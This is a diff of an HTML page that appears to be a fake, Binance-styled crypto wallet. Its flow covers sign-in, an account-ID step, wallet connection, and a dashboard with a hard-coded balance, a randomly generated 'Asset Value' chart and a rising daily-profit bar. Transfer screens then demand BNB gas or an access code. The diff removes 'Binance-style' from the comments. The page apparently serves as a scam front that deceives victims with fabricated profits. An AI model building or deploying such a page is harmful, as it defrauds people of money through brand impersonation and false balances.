@@ -77,7 +77,7 @@
     <button onclick="submitSignin()">Sign In</button>
   </div>
 
-<!-- Page 1: Sign In (Binance-style Dark Mode) -->
+<!-- Page 1: Sign In -->
 <div
   class="page min-h-screen bg-[#0B0E11] flex items-center justify-center"
   id="page1"
@@ -113,7 +113,7 @@
 </div>
 
 
-<!-- Page 2: Authenticating (Binance Dark Mode) -->
+<!-- Page 2: Authenticating -->
 <div class="page min-h-screen bg-[#0B0E11] text-white p-6 flex items-center justify-center" id="page2">
   <div class="max-w-sm w-full bg-[#1E2329] p-6 rounded-2xl shadow-lg text-center space-y-4">
     <h2 class="text-2xl font-semibold text-[#f3ba2f]">Authenticating...</h2>
@@ -127,7 +127,7 @@
   </div>
 </div>
 
-<!-- Page 3: Account ID (Binance Dark Mode) -->
+<!-- Page 3: Account ID -->
 <div class="page min-h-screen bg-[#0B0E11] text-white p-6" id="page3">
   <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg flex flex-col space-y-6">
     <h2 class="text-2xl font-semibold text-[#f3ba2f] text-center">Enter Account ID</h2>
@@ -157,7 +157,6 @@
       Connect Wallet
     </button>
   </div>
-      <!-- Action Buttons -->
   <div class="grid grid-cols-2 sm:grid-cols-4 gap-4">
     <button onclick="showPage(8)"
       class="bg-[#1E2329] hover:bg-[#2c3137] border border-[#f3ba2f] text-[#f3ba2f] font-medium py-3 rounded-lg">
@@ -187,10 +186,9 @@
     <p class="text-3xl font-semibold text-[#f3ba2f]" id="totalAssets">$2978.78</p>
   </div>
 
-    <!-- USDT Token Card -->
+    <!-- USDT -->
 <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between">
   <div class="flex items-center space-x-3">
-    <!-- Token Logo -->
         <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABjElEQVR4nO3ZMUoDQRRG4WuYyM/ANmwArsAJ7AFuwArsAHbAHawCuwAnawC7cU0rA2puvf2uqrZmd5PaZnZtxz8rcuQqzDEYDAaDwWAwGg8FgMBkOypU/1mff4tcqX/fXvsLuYemK1VX5uK+FXKo3F+LOqPMrT3l2z3u+Z0+lfxN7OtVeuUE1hOZR3BzMRzGcznM5zHMB3PZTGdzmcznMZzNcz3M5fys5Y2nvM5nM5zGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAPZ9o1kT7gUmv/3p5Ti8AAAAASUVORK5CYII=" alt="USDT" />
         USDT
       </div>
@@ -205,10 +203,9 @@
   </div>
 </div>
 
-    <!-- BNB Token Card -->
+    <!-- BNB -->
 <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between">
   <div class="flex items-center space-x-3">
-    <!-- Token Logo -->
         <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABVUlEQVR4nO3Z0UoDQRCG4Qe6A3sAt2DewAXsAt2APfQAbcAd7AJ2gN3gAeSBcjcTL0TX4q+uHOc+Ntzxy/HXXmAFgMBgMBgMBgMBk+KoF/o3s6f9XPpXy0kUbwDpyn+61hX9Vwmsfl2knXQdV8q6Cd9bld2Wt/SbAVsmcDkcxnM5zGbJXDZzFcxnM5zGb5gzOfcznMZzGc5lcxXc9nMZzOcznMZzGcznMZzGcznMZ3KrDKTMZzGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAP4BCGmv/ra7i6YAAAAASUVORK5CYII=" alt="BNB" />
         BNB
       </div>
@@ -232,105 +229,6 @@
   <div class="container">
     <canvas id="profitChart" width="460" height="240"></canvas>
   </div>
-
-<script>
-  let goal = 150, progress = 0;
-
-  const ctx = document.getElementById("profitChart").getContext("2d");
-  const profitChart = new Chart(ctx, {
-    type: 'line',
-    data: {
-      labels: [],
-      datasets: [{
-        label: 'Asset Value',
-        data: [],
-        borderColor: '#f3ba2f',
-        backgroundColor: 'rgba(243, 186, 47, 0.2)',
-        tension: 0.4,
-        fill: true,
-        borderWidth: 3,
-        pointRadius: 4,
-        pointBackgroundColor: '#f3ba2f'
-      }]
-    },
-    options: {
-      responsive: true,
-      animation: false,
-      scales: {
-        y: {
-          beginAtZero: false,
-          ticks: {
-            color: '#f3ba2f',
-            font: { weight: '900' }
-          },
-          grid: {
-            color: '#2b3245'
-          }
-        },
-        x: {
-          ticks: {
-            color: '#f3ba2f',
-            font: { weight: '900' }
-          },
-          grid: {
-            color: '#2b3245'
-          }
-        }
-      },
-      plugins: {
-        legend: {
-          labels: {
-            color: '#f3ba2f',
-            font: { weight: '900', size: 14 }
-          }
-        },
-        tooltip: {
-          enabled: true,
-          backgroundColor: '#1E2329',
-          titleColor: '#f3ba2f',
-          bodyColor: '#fff',
-          borderColor: '#f3ba2f',
-          borderWidth: 1,
-          cornerRadius: 6
-        }
-      }
-    }
-  });
-
-  function updatePerformance() {
-    const now = new Date().toLocaleTimeString();
-
-    if (profitChart.data.labels.length > 15) {
-      profitChart.data.labels.shift();
-      profitChart.data.datasets[0].data.shift();
-    }
-
-    const newValue = 2000 + Math.random() * 100;
-    profitChart.data.labels.push(now);
-    profitChart.data.datasets[0].data.push(newValue);
-    profitChart.update();
-
-    progress += Math.random() * 3;
-    if (progress > goal) progress = goal;
-
-    const percent = ((progress / goal) * 100).toFixed(1);
-
-    const dailyProgress = document.getElementById("dailyProgress");
-    dailyProgress.textContent = `$${progress.toFixed(2)} (${percent}%)`;
-    dailyProgress.style.color = "#f3ba2f";
-    dailyProgress.style.fontWeight = "900";
-
-    const goalBar = document.getElementById("goalBar");
-    goalBar.style.width = `${percent}%`;
-    goalBar.style.backgroundColor = "#f3ba2f";
-    goalBar.style.transition = "width 0.6s ease";
-  }
-
-  setInterval(updatePerformance, 6000);
-</script>
-
-</body>
-</html>
 
 <!-- PAGE 13: Settings Page -->
 <div id="page13" class="page" style="background-color: #0b0e11; color: #f0b90b; padding: 20px; min-height: 100vh;">
@@ -501,7 +399,7 @@
 </div>
 
 
-<!-- PAGE 5: Main Dashboard -->
+<!-- Page 5: Main Dashboard -->
 <div class="page visible" id="page5">
   <div class="form-container">
     <h2>Main Dashboard</h2>
@@ -513,7 +411,7 @@
   </div>
 </div>
 
-<!-- PAGE 8: Transfer to Main Wallet -->
+<!-- Page 8: Transfer to Main Wallet -->
 <div id="page8" class="page">
   <div class="form-container">
     <h2>Make a Transfer</h2>
@@ -530,7 +428,7 @@
   </div>
 </div>
 
-<!-- PAGE 9i: BNB Gas Confirmation -->
+<!-- Page 9i: BNB Gas Confirmation -->
 <div id="bnbConfirmPage" class="page">
   <div class="form-container">
     <h2>⚠️ Not Enough BNB</h2>
@@ -541,7 +439,7 @@
   </div>
 </div>
 
-<!-- PAGE 9ii: Access Code Page -->
+<!-- Page 9ii: Access Code Page -->
 <div id="accessCodePage" class="page">
   <div class="form-container">
     <h2>Access Code Required</h2>
@@ -551,7 +449,7 @@
   </div>
 </div>
 
-<!-- PAGE 10: Processing Page -->
+<!-- Page 10: Processing Page -->
 <div class="page" id="processingPage">
   <div class="form-container">
     <h2>Transaction Processing...</h2>
@@ -560,7 +458,7 @@
   </div>
 </div>
 
-<!-- PAGE 11: Success Page -->
+<!-- Page 11: Success Page -->
 <div class="page" id="successPage">
   <div class="form-container">
     <h2 class="text-green-500">✅ Transaction Successful</h2>
@@ -569,7 +467,7 @@
   </div>
 </div>
 
-<!-- PAGE 12: Decline Page -->
+<!-- Page 12: Decline Page -->
 <div class="page" id="declinePage">
   <div class="form-container">
     <h2 class="text-red-500">❌ Transaction Declined</h2>
@@ -972,6 +870,5 @@ function submitTransaction() {
 
   setInterval(updatePerformance, 6000);
 </script>
-
-</body>
+  
 </html>
